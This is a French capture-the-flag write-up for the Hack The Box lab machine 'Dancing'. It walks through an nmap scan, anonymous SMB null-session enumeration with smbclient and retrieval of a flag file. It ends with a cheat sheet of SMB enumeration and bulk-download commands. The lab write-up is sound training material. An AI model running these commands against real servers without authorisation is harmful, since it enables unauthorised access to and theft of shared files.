# Dancing — HTB Starting Point (Tier 0)

| | |
|---|---|
| **Section** | Starting Point — Tier 0 |
| **Machine** | `Dancing` |
| **OS** | Windows |
| **IP cible** | `10.129.243.130` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-02 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap  →  135 msrpc · 139 netbios · 445 SMB · 5985 WinRM (Windows)
      →  smbclient -L //$IP/ -N  (null session)  →  partage non-standard "WorkShares"
      →  smbclient //$IP/WorkShares -N  (connexion sans mot de passe)
      →  dossiers Amy.J / James.P  →  James.P/flag.txt  →  get flag.txt
```

---

## 1. Reconnaissance

```bash
box dancing <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP
```

| Port | Service | Détail |
|---|---|---|
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS |
| 445/tcp | microsoft-ds | **SMB** |
| 5985/tcp | http | WinRM (Microsoft HTTPAPI 2.0) |

`Service Info: OS: Windows`. Les ports 139/445 = **SMB**, le cœur de la box.

> ⚠️ **Piège de scan** : `nmap -p-` (65535 ports) sur cette cible Windows partait sur **~40 min** (SYN scan très lent). Le scan par défaut (top-1000) avec `-Pn` a trouvé les ports SMB en **17 s**. Leçon : garder le `-p-` pour le fond (en tâche de fond), mais un scan par défaut suffit souvent à démarrer — surtout quand les ports sont standard (contrairement à Redeemer/Redis sur 6379).

---

## 2. Accès → flag

**Le concept :** SMB est le protocole de **partage de fichiers Windows**. Une **null session** (session nulle, `-N` = pas de mot de passe) permet parfois de lister et lire des partages sans aucun identifiant.

**Étape 1 — lister les partages (null session) :**

```bash
smbclient -L //$IP/ -N
```

```
Sharename       Type      Comment
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk                      <-- partage non-standard = la cible
```

`ADMIN$`, `C$`, `IPC$` sont des partages administratifs par défaut. **`WorkShares`** est ajouté manuellement → c'est lui qu'on explore.

**Étape 2 — se connecter au partage :**

```bash
smbclient //$IP/WorkShares -N
```

> ⚠️ **Confusion rencontrée** : `-L` sert à **lister les partages du serveur** — peu importe ce qu'on met derrière (`-L //$IP/WorkShares` ré-affiche juste la liste). Pour **entrer** dans un partage, on retire le `-L` : `smbclient //$IP/<Partage> -N`.

**Étape 3 — naviguer et récupérer le flag :**

```
smb: \> ls                 # -> dossiers Amy.J et James.P
smb: \> cd James.P\
smb: \James.P\> ls         # -> flag.txt
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

Le flag arrive dans le dossier courant côté Kali.

---

## 3. Mémo SMB (énumération)

| Besoin | Commande |
|---|---|
| Lister les partages (null session) | `smbclient -L //$IP/ -N` |
| Se connecter à un partage | `smbclient //$IP/<Partage> -N` |
| Partages + droits (R/W) d'un coup | `smbmap -H $IP -u guest` |
| Énumération complète auto | `enum4linux-ng -A $IP` |
| Couteau suisse SMB | `nxc smb $IP -u '' -p '' --shares` |
| Tout télécharger d'un partage | dans smbclient : `recurse ON` ; `prompt OFF` ; `mget *` |

---

## 4. Leçons à retenir

- **Null session SMB** (`-N`) : toujours tester sur un 445 ouvert. Un partage non-standard (`WorkShares`) est le signal qu'il y a quelque chose à voir.
- **`-L` liste, sans `-L` on se connecte** : deux usages distincts de `smbclient`.
- **Partages par défaut vs ajoutés** : `ADMIN$`/`C$`/`IPC$` = normaux ; ce qui sort de la liste standard mérite l'attention.
- **Stratégie de scan selon l'OS** : `-p-` peut être très lent sur Windows. Lancer un scan par défaut pour démarrer, et le full scan en parallèle/arrière-plan.

---

## Commandes — récap express

```bash
box dancing <IP>
nmap -Pn -sV -sC -oN nmap/initial $IP          # -> 445 SMB
smbclient -L //$IP/ -N                          # -> WorkShares
smbclient //$IP/WorkShares -N
# smb: \> cd James.P\ ; get flag.txt
cat flag.txt
```
